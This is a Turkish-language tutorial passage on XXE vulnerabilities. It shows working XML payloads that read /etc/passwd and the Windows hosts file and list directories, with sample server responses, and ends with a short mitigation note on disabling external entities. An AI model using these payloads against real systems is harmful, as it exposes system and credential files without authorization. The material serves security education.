XXE zafiyetinin en yaygın sömürülme biçimlerinden biri, sunucudaki yerel dosyaları okumaktır. Bu, saldırganların hassas yapılandırma dosyalarına, parolalara veya diğer önemli verilere erişmesine olanak tanıyabilir.

### Temel Dosya Okuma

Bir saldırgan,

file://

şemasını kullanarak sunucudaki herhangi bir dosyayı okumak için bir XML harici varlığı tanımlayabilir.

Örnek: Aşağıdaki XML payload'ı,

/etc/passwd

dosyasını okumak için kullanılabilir:

HTTP İstek Örneği:

```auto
POST /vulnerable-endpoint HTTP/1.1
Host: example.com
Content-Type: application/xml
Content-Length: 123

<?xml version="1.0" ?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

Uygulama bu XML'i işlediğinde,

&xxe;

varlığı

/etc/passwd

dosyasının içeriğiyle değiştirilir ve bu içerik, uygulamanın yanıtında döndürülür.

Yanıt Örneği:

```auto
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

### Windows Sistemlerinde Dosya Okuma

Windows sistemlerinde, dosya yolları farklıdır. Örneğin,

C:\Windows\System32\drivers\etc\hosts

dosyasını okumak için aşağıdaki payload kullanılabilir:

```auto
<?xml version="1.0" ?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<user>
  <name>&xxe;</name>
</user>
```

Yanıt Örneği:

```auto
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
...
```

### Dizin Listeleme

Bazı durumlarda,

file://

şeması dizinleri listelemek için de kullanılabilir. Bu, saldırganın sunucudaki dosya sistemini keşfetmesine olanak tanır.

Örnek:

```auto
<?xml version="1.0" ?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/">
]>
<user>
  <name>&xxe;</name>
</user>
```

Bu payload,

/etc/

dizininin içeriğini listeleyebilir. Ancak, bu davranış tüm XML ayrıştırıcılarında ve sistem yapılandırmalarında desteklenmeyebilir.

Yanıt Örneği:

```auto
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

crontab
hosts
issue
passwd
...
```

### Önlemler

Bu tür saldırıları önlemek için, XML ayrıştırıcınızda harici varlık işlemeyi devre dışı bırakmak en iyi uygulamadır. Bu, genellikle ayrıştırıcı yapılandırmasında bir özellik ayarlanarak yapılabilir. Harici varlıklar gerekiyorsa, güvenilmeyen kaynaklardan gelen XML girdilerini dikkatli bir şekilde doğrulamalı ve temizlemelisiniz.
